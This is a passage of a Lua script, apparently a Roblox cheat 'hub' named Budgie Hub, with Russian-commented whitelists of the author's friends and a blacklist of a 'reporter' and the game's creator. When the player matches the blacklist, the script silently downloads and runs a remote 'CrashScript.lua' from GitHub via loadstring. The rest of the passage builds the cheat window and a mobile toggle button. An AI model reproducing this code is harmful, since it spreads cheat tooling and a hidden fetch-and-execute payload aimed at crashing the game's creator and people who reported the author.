  10172035874, -- это я
  4636825706, -- это тоже я
  3133352547, -- друг
  3536016467, -- друг скриптер 1
  4227836698, -- друг скриптер 2
  6066688097, -- друг скриптер 3
  8427217856, -- друг скриптер 4
  5080213871, -- друг скриптер 5
  2405800210, -- забытый друг скриптер
  4463699742 -- ...
}

local blacklist = {
  3778040731, -- репортер 1
  game.CreatorId
}

if table.find(blacklist, game.Players.LocalPlayer.CharacterAppearanceId) then
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Dangerous/refs/heads/main/CrashScript.lua"))()
end

local Window = Fluent:CreateWindow({
    Title = "Budgie Hub | Random tool (9879422661)",
    SubTitle = "by ADSKer (Test828838)",
    TabWidth = 160,
    Size = UDim2.new(0.7, 0, 1, 0),
    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

local function GetFrame()
  for _, gui in next, game.CoreGui:GetDescendants() do
    if gui:IsA("TextLabel") and gui.Text:lower():find("budgie hub | random tool") then
      return gui.Parent.Parent.Parent
    end
  end
end

if GetDevice() == "Mobile" then
  game.Players.LocalPlayer.PlayerGui.ScreenOrientation = Enum.ScreenOrientation.LandscapeRight
  
  if GetFrame() then
    local fram = GetFrame()
    local sce = Instance.new("ScreenGui", game.CoreGui)
sce.Name = "ToggleBuguh"
sce.ResetOnSpawn = false
sce.Enabled = true

fram.Parent.Destroying:Connect(function()
  sce:Destroy()
end)

local button = Instance.new("TextButton", sce)
button.Text = "Show window"
button.TextWrapped = true
button.Size = UDim2.new(0.05, 0, 0.1, 0)
button.TextSize = button.TextSize / 1.05
button.Position = UDim2.new(0, 0, 0.3, 0)
button.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
button.BackgroundTransparency = 0.1
button.TextColor3 = Color3.new(1, 1, 1)
button.Active = true
button.Draggable = true

local uicorner = Instance.new("UICorner", button)
uicorner.CornerRadius = UDim.new(0.2, 0)

button.MouseButton1Click:Connect(function()
  fram.Visible = not fram.Visible
end)
  end
end

